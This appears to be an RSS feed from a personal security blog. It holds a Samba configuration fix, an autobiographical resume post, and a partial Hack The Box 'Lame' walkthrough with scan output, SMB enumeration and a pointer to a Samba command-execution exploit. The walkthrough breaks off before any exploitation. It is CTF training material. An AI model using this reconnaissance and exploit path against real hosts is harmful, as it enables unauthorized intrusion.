<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://hiimzackjones.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://hiimzackjones.github.io/" rel="alternate" type="text/html" /><updated>2020-09-30T23:07:41-04:00</updated><id>http://hiimzackjones.github.io/feed.xml</id><title type="html">Zack Jones</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
</subtitle><author><name>Zack Jones</name></author><entry><title type="html">Smbclient Giving Weird Errors - A Fix.</title><link href="http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html" rel="alternate" type="text/html" title="Smbclient Giving Weird Errors - A Fix." /><published>2020-09-30T18:55:00-04:00</published><updated>2020-09-30T18:55:00-04:00</updated><id>http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix</id><content type="html" xml:base="http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html">&lt;p&gt;So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbclient.png&quot; alt=&quot;smbclient error&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/smbclient.png&quot; alt=&quot;smbclient error 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After doing some research, I found out that it was because smbclient was trying to use a higher version of Samba. So I’m writing this quick post as a reminder to myself how to fix it but hopefully it will help some of you guys out as well.&lt;/p&gt;

&lt;p&gt;First find the Samba conf file. It’s almost always in /etc/samba/smb.conf. I ran a quick find just in case.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Linux/SambaConfPost/SambaVersionFind.png&quot; alt=&quot;Finding Samba Conf file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then I hopped onto the conf and added NT1 as the lowest accepted version.&lt;/p&gt;

&lt;p&gt;I added this to the Global section of the file -&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;min protocol = NT1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Linux/SambaConfPost/SambaConfEdit.png&quot; alt=&quot;SMB Conf Edit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;This is a good time to mention that you most likely want to have your SMB version as high as possible on machines you’d like to protect from SMB vulnerabilities. This works fine for a pentesting machine, but any other machine maybe should be set to highest possible. Here are some options for setting it. Here are some more options for setting the version.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;min protocol = SMB2
min protocol = SMB3
client min protocol = SMB2
max protocol = SMB2
protocol = SMB3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Notice you can set it to a specific SMB version, lowest version, highest version, and the same settings for client side.&lt;/p&gt;

&lt;p&gt;Okay lets go back and test to see what happens.&lt;br /&gt;
&lt;em&gt;But first&lt;/em&gt; - make sure to reset your smb service.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo systemctl restart smbd.service
or 
sudo systemctl restart smb.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;when I restart the service it still didn’t work correctly. So I restarted the machine to make sure the correct service was restarted and it worked!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Linux/SambaConfPost/SMBFixed.png&quot; alt=&quot;Imagine of it working goes here&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay there ya go. Hope this helps if you’re getting similar NT errors while poking at CTFs or even pentesting!&lt;/p&gt;

&lt;p&gt;Cheers, 
Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Linux" /><summary type="html">So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.</summary></entry><entry><title type="html">Because Resumes Just Aren’t That Good</title><link href="http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes.html" rel="alternate" type="text/html" title="Because Resumes Just Aren’t That Good" /><published>2020-09-03T16:30:00-04:00</published><updated>2020-09-03T16:30:00-04:00</updated><id>http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes</id><content type="html" xml:base="http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes.html">&lt;h1 id=&quot;oh-hello&quot;&gt;Oh.. hello&lt;/h1&gt;
&lt;p&gt;If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience &lt;a href=&quot;/blog/2020/09/03/Resume.html&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;who-i-am&quot;&gt;Who I am&lt;/h1&gt;

&lt;p&gt;Okay so, by now you’ve figured out my name is Zack and I’m 30 and I do Cyber Security things. Here is the shortest version of the story.&lt;/p&gt;

&lt;h1 id=&quot;highschool&quot;&gt;Highschool&lt;/h1&gt;
&lt;p&gt;Mesmerized by media’s depiction of ‘hackers’ from movies like The Matrix, Hackers, 007 Goldeneye (Boris’ pen twirl is a must have skill for any hacker), and loads of other movies, hacking seemed to be some sort of high caliber, techno genius level magic trick show and I couldn’t get enough of it. But of course that meant massive intimidation. These people were super heroes in their own way. The best magic trick I could ever do was the coin behind the ear thing.&lt;/p&gt;

&lt;iframe src=&quot;https://giphy.com/embed/hNJwTYxnfK3te&quot; width=&quot;480&quot; height=&quot;204&quot; frameborder=&quot;0&quot; class=&quot;giphy-embed&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;It wasn’t until a keyboarding class in 9th grade that I began dabbling. See I had mastered typing way before this class, making every 30 minute assignment about 10 minutes long and it was a 45 minute class. So like any other bored chap in 2004, all I wanted to do was watch cartoons to pass the time. Specifically the beautiful internet treasure that is known as Newgrounds.com. Of course a website with bloody and sometimes adult themed games was 100% &lt;strong&gt;blocked&lt;/strong&gt;. The Barracuda filter mocking me each time I tried. So I did some Googling and found this cheeky little site called Hackthissite.org. HackThisSite just happened to have a post on barracuda filters and I quickly learned that it blocked based off of some weird thing called DNS and if I didn’t resolve the names, it wouldn’t get blocked. I went home and had my first round with the command prompt. Typing in that black box was pure magic despite the only thing I typed was a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping newgrounds.com&lt;/code&gt;. I was suddenly Neo and the world was just a command line execution away. I cast this new super secret hacker spell and it conquered out a set of numbers. The next day at school I did a little &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://51.79.77.158/&lt;/code&gt; in the browser. This was my very first “We’re in” moment. In my head I was a master hacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Resume/newgrounds.png&quot; alt=&quot;2004 Newgrounds screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was watching as much &lt;em&gt;Salad Fingers&lt;/em&gt; and &lt;em&gt;Weebl and Bob&lt;/em&gt; a 14 year old could fit in during a 45 minute class. But it was the other site, the sneaky one for hackers that really started to consume my mind after this. Geez…there is an actual site called Hack this site. Insane. This site became my only past time. I started posting on the forums daily. I quickly was yelled at by strangers on the internet in posts telling me&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;“… freaking script kiddie. learn html, javascript, how computers work before you come in and ask how to hack something…”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Embarrassing but… I’m glad they responded that way. Because that’s exactly what I did next. For the next 6 years or so. Learning Javascript injection, SQL, HTML, how cookies worked, and how to watch non SSL http traffic. This is where I started my deep dive into CTFs and challenges.&lt;/p&gt;

&lt;h1 id=&quot;college&quot;&gt;College&lt;/h1&gt;
&lt;p&gt;You’d think that with my interest being in Cyber Security I’d try to go to school for it, but this is 2007/2008 and back then Cyber Security was different. From what the advisors said, my best bet was Cisco CCNA and that I’d be better off considering engineering or becoming a programmer/developer. It seemed like the skill set and excitement for breaking things would only be useful if I did something legally questionable and hope that the authorities or company find me useful… and I wasn’t really interested in taking that kind of risk. So I went to school for engineering and the fun cyber stuff went on the back burner and became a really niche replacement for video games.&lt;/p&gt;

&lt;h1 id=&quot;hacking-as-a-hobby&quot;&gt;Hacking as A Hobby&lt;/h1&gt;
&lt;p&gt;For the next few years after deciding that Cyber Security wouldn’t be a field I could get into. I continued to test my skills in any way I could that was…ahem…legal. I found sites like Vulnhub.com, Hackthebox.eu, ctflearn.com, and spent loads of time watching Hak5 and Metasploit Minute. I even set up a small lab using a outdated gaming computer I had built during college. If I ran into a machine with a vulnerability I had never seen before, I dug into it and studied it. My goal at this point was just to get proficient enough to be good at CTFs, especially those I had heard about in DefCon YouTube videos.&lt;/p&gt;

&lt;h1 id=&quot;the-turnaround&quot;&gt;The Turnaround&lt;/h1&gt;
&lt;p&gt;Roughly in 2015, a friend told me that the local college had a Cyber Security program backed by the NSA now and it was all over the news that talent in the field was hard to come by and that things had changed. So at 26 I went back to college. I’m a horrible classroom student, and I somehow convinced the Director that I could swing it. I expected to be the underdog in all the classes, assuming my self taught level of knowledge would barely be able to get me past the first semester. Come to find out, I was way ahead of the curve. This was the boost that I needed to really start the professional part of my journey.&lt;/p&gt;

&lt;h1 id=&quot;the-professor&quot;&gt;The Professor&lt;/h1&gt;
&lt;p&gt;I had a Windows Server class my first semester. My advisor told me that he felt I could jump a few classes based off of what the professors were saying and his experience with me in the classroom. So I started the class. I had broken into a few Active Directory boxes before and had studied group policy so I was fairly experienced at the topic. About 4 weeks in the server class professor asked me if I was interested in a networking internship. I told him I had bills and I couldn’t be taking on unpaid work. “Zack, listen to me when I say this”&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;I’m moving and quiting my other job as IT Director and you know more than any CCNA certified applicant I’ve talked to”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Six months later I was hired as the IT Director, and the only IT employee at a private military school with roughly 300 users, 12 managed layer 3 switches, 35 access points, Barracuda web filters, web shaping hardware, 2 extremely outdated Cisco ASA, and a weird combination of Windows Server and Novell. Needless to say my two years spent as IT Director was a learning experience, but just futher fed my desire to keep going. The days the network started acting funny or would drop were my favorite days. Chasing down routing and starring at packets was the most exciting part of my job the few times it happened.&lt;/p&gt;

&lt;h1 id=&quot;teaching-high-school-intro-to-cyber-security&quot;&gt;Teaching High School Intro to Cyber Security&lt;/h1&gt;
&lt;p&gt;My first year I was asked to teach Introduction to Cyber Security. My class was about 8 kids ranging from 13 to 18. I used a combination of a curriculum I found suggested by VirginiaCyberRange.org and other resources I found useful. The real challenge wasn’t teaching a room full of teenagers. But stepping back into the fundamentals and relearning from the beginning. Through all the years I had been working on CTFs, I had learned a sense of intuition for the skills, but never realized things like a pentesting methodology existed. Teaching a topic sometimes forces you to fill in the gaps. 
I also realized that the curriculum was extremely dry for a room of teens hoping for that same bit of magic tricks I had experienced at their age. After about 4 weeks of following the outlined curriculum we switched over to working on Vulnhub machines, having in depth discussions on topics like Stuxnet, Andrew Auernheimer’s AT&amp;amp;T iPad hack of 2011, WannaCry, and watched Red Team engagements. The classroom soon became the highlight of my day. Fifteen years after I fell in love with Cyber Security I’m surrounded by teenagers experiencing the same magic that got me started. It was during this time that I decided to schedule out my next couple of years with the goal of being a pentester by 2021.&lt;/p&gt;

&lt;h1 id=&quot;chasing-the-oscp&quot;&gt;Chasing the OSCP&lt;/h1&gt;
&lt;p&gt;So here we are. This is now. I won’t write a lot about this here. I will most likely blog the whole process from start to finish on a separate post. Here are some of the key notes on how I’ve gone about getting the OSCP. Specifically the preparation before purchasing the labs.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Find a Udemy class designed for OSCP. I have a few I really liked.&lt;/li&gt;
  &lt;li&gt;Find a professional that will be willing to be your mentor. Find more than one. Talk to as many people as you can about their process and to make assessment on your skill set. Having someone watch you work is absolutely the best way to learn how to get better.&lt;/li&gt;
  &lt;li&gt;Do any and every Easy or Medium HacktheBox.eu box you can. &lt;em&gt;also the question of writeups come up a lot. Always have a writeup ready for reference if you get stuck, but don’t use it as step by step instructions if you can help it&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Google how to enumerate each port you find. Make notes.&lt;/li&gt;
  &lt;li&gt;Write what you’ve done. Take the time to do this. Write the most basic version of what your process was like. A few weeks or months later, go back to edit the notes, forcing you to follow them and re-work the box.&lt;/li&gt;
  &lt;li&gt;Publish things and have a professional critique your process.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Oh.. hello If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience click here.</summary></entry><entry><title type="html">Lame HTB Writeup</title><link href="http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup.html" rel="alternate" type="text/html" title="Lame HTB Writeup" /><published>2020-05-17T18:00:00-04:00</published><updated>2020-05-17T18:00:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup.html">&lt;p&gt;Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out &lt;a href=&quot;/infosec/2020/05/15/Legacy-HTB-Writeup.html&quot;&gt;Legacy&lt;/a&gt; first. Feel free to use my writeup for that one as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/WebsiteScreenshot.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If this writeup isn’t enough, HTB does include &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/1&quot;&gt;a writeup&lt;/a&gt; on the site. There are also plenty of videos online how to do this box as well.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Here we gooo&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As per usual, we are going to start with some basic scanning to figure out what this bad boy is running and try to find any vulnerabilities right off the bat. Similar to the Legacy box we did, I will scan it using two methods. &lt;strong&gt;Big Nmap&lt;/strong&gt; and &lt;strong&gt;NmapAutomator&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A -T4 -p- 10.10.10.3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Note: you might need do throw a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; on it. Additionally, much of my notes are from the first time I broke into this box. I went back a second time to grab screenshots, in doing so, it seems that some of the results were different. For example the FTP server showed up as 2.3.4 one time and 3 the next. We can just make a note of that for now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/nmap.png&quot; alt=&quot;Nmap&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:09 EDT
 Nmap scan report for 10.10.10.3
Host is up (0.11s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h56m27s, deviation: 2h49m45s, median: -3d02h56m29s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-09-26T14:25:22-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 158.93 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s break this scan down to some bullet points of useful information.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Machine info&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS - Linux/Unix&lt;/li&gt;
  &lt;li&gt;Hostname - Lame&lt;/li&gt;
  &lt;li&gt;Domain - Hackthebox.gr&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Ports open&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;21 - FTP&lt;/li&gt;
  &lt;li&gt;22 - SSH&lt;/li&gt;
  &lt;li&gt;139 - netbios-ssn (evidence of smb)&lt;/li&gt;
  &lt;li&gt;445 - microsoft-ds (more evidence of smb)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Extra info&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Anonymous FTP allowed&lt;/li&gt;
  &lt;li&gt;OpenSSH version 4.7p1&lt;/li&gt;
  &lt;li&gt;ports 139 &amp;amp; 445 suggest SMB&lt;/li&gt;
  &lt;li&gt;Samba version 3.0.20 - Debian&lt;/li&gt;
  &lt;li&gt;port 3632 for distccd (distcc compiler)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Looking ahead, we can already guess that smb is going to be the low hanging fruit. Possibly even FTP as well. The distccd was something I had yet to run into before, we will look at that later. Before we go any further let’s compare notes against a NmapAutomator scan.&lt;/p&gt;

&lt;h2 id=&quot;nmap-automator&quot;&gt;Nmap Automator&lt;/h2&gt;
&lt;p&gt;So I’ve mentioned this script before, if you’re interested in seeing what all it scans and tests out, head over to the Github and read the documentation.
&lt;a href=&quot;https://github.com/21y4d/nmapAutomator/&quot;&gt;NmapAutomator Github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If I were to take a screenshot, it would take up a massive part of the page. So I’ve linked a live video of the scan running below. Feel free to take a look. The video allows for copy and paste as well.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/pPTcqnbAhrYWhSQhLOe8cc7bo&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/pPTcqnbAhrYWhSQhLOe8cc7bo.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Or you can just look at the file here - &lt;a href=&quot;/assets/img/Walkthroughs/Lame/Lame-nmap-auto.txt&quot;&gt;nmapAutomator-Scan-File&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Out of this massive scan, there are a few things we have learned about this machine that could be useful moving forward. I’ve pulled snippets from the full scan.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So we got a confirmation on ports here.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Oof!&lt;/em&gt; FTP anonymous login is accepted.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Samba version here.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Another oof!&lt;/em&gt; Challenge response is supported &lt;strong&gt;but&lt;/strong&gt; message signing is disabled. Good ole default settings here.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
|_      CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Some cute little CVEs for the SSH just in case FTP and SMB doesn’t give us any love here. It later lists these vulnerabilities.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       CVE-2007-2768   4.3     https://vulners.com/cve/CVE-2007-2768
|       CVE-2014-9278   4.0     https://vulners.com/cve/CVE-2014-9278
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Wellll welll well. Looks like this weird port that I’ve never seen before has a CVE for it as well. AND it’s highly vulnerable. Awesome. Looking good for us bad guys so far.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------------Running Recon Commands----------------------


Starting smbmap scan

[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
Disk                                                    Permissions     Comment
----                                                    -----------     -------
print$                                                  NO ACCESS       Printer Drivers
tmp                                                     READ, WRITE     oh noes!
opt                                                     NO ACCESS
IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

Finished smbmap scan

=========================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;LMAO OOOOF&lt;/em&gt; we keep finding goodies here. Looks like we have read and write in the 10.10.10.3:445/tmp location here kids. This could be extra useful.&lt;/p&gt;

&lt;h2 id=&quot;smb-enum&quot;&gt;SMB Enum&lt;/h2&gt;
&lt;p&gt;So I would be slacking if I didn’t write out some specific ways to enumerate SMB. Our nmapAutomater.sh script really did great work, but even after all that, I would highly suggest picking out something to focus on from that list of interesting fellas, and focus on it. Confirm it yourself, and then move forward. So let’s do some SMB enumeration real quick like.&lt;/p&gt;

&lt;h2 id=&quot;smbmap&quot;&gt;SMBMap&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbmap.png&quot; alt=&quot;SMBMapScreenshot&quot; /&gt;
Okay that looks about right. Identical to what we saw before.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbmap2.png&quot; alt=&quot;SMBMapScreenshot&quot; /&gt;
Adding -R gives a little bit more information by going recursively into the folders.&lt;/p&gt;

&lt;h2 id=&quot;smbclient&quot;&gt;smbclient&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbclient.png&quot; alt=&quot;smbclient screenshot&quot; /&gt;&lt;br /&gt;
Great so we can successfully login with no password. It even tells us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Anonymous login successful&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Being that this is a CTF, we can be a little messy. Let’s test our ability to put a file on the file server anonymously.&lt;br /&gt;
&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbclientpoke.png&quot; alt=&quot;smbput test&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sweet! We are able to put files on the victim machine. This could be our ticket.&lt;/p&gt;

&lt;h2 id=&quot;smb-version-samba-smbd-3020-debian&quot;&gt;SMB version Samba smbd 3.0.20-Debian&lt;/h2&gt;

&lt;p&gt;Okay let’s take a peek around to see what we can find for vulnerabilities for SMB.&lt;/p&gt;

&lt;p&gt;A quick little &lt;em&gt;searchsploit&lt;/em&gt; search shows some tasty stuff. 
&lt;img src=&quot;/assets/img/Walkthroughs/Lame/searchsploit.png&quot; alt=&quot;searchsploit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The one in paticular that stands out is the Samba 3.0.20 Command Execution with a Metasploit module.&lt;br /&gt;
It’s the exact version and it’s code execution which is &lt;em&gt;mwah chefs kiss&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Let’s do some searching on metasploit real fast to see what we can find.&lt;br /&gt;
